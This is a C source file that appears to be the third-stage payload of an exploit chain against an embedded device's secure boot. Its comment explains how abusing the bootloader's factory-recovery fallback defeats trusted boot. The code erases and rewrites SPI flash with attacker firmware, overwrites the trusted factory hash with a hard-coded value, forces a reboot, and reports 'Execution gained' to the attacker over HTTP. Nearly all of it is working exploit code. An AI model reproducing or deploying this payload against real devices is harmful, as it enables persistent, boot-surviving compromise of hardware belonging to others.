#include "payload_12_81.h"

void print();

void __start(){
    /*
    Stage 3: Exploiting bootloader to evade trusted boot

    Every step of the boot process verifies the hash of the next before proceeding to execution
    Fortunately, we can change the hash of the app from the app by exploiting the failed update recovery mechanism

    The app preserves the factory bundle at spi flash address 0x0 when updating.
    Usually, ARCompact stage of the bootloader just loads the OTA updated app stored after the factory bundle.

    However, the bootloader notices the hash of the OTA app is not correct, it will attempt to recover & boot the factory bundle
    It doing so, it verifies that the hash of the factory app matches a value fed to it by the ARM trusted boot chip

    That hash can be written to by the app at any time. We simply update it to the hash of our desired app, then write our app to flash.
    In doing so, we also invalidate the OTA update, causing the exploitable fallback behavior to trigger.
    */

    debug_printf("payload started\n");
    debug_printf("erasing spi flash\n");
    for(int i = 0; i < 0xee000; i+= 0x1000){
        spi_erase(i);
    }
    debug_printf("spi erase done\n");
    debug_printf("writing spi flash\n");

    spi_write(0x0, (char*)0x40001000, 0xee000);
    debug_printf("spi write done\n");

    
    debug_printf("old hash:\n");
    print((char*)0x20002c00);

    // Hard coding this is kinda ugly, but meh
    char *new_sha = "\xa0\x37\x21\x93\x42\x19\x26\x9b\x5\xc5\xdc\x15\x52\x97\x72\xbc\x9c\x14\x31\x26\x57\xbd\xcf\x3d\x1b\x5b\xc4\x12\x56\xb7\x1b\xe5";
    save_sha((int) new_sha);

    debug_printf("new hash:\n");
    print((char*)0x20002c00);

    debug_printf("rebooting\n");
    send_to_tb(0x80, 0x8);
    debug_printf("wrote to tb \n");

    // Let the attacker know it worked
    char *eresp = "Execution gained. Reflashed and rebooting.";
    send_http_response(0, eresp, 2, 20);

    // Restore this thread to where it should be, not that it really matters
    ret();
}

void print(char* buf){
    for(int i = 0; i < 0x20; i++){
        debug_printf("%02x ", buf[i]);
    }
    debug_printf("\n");
}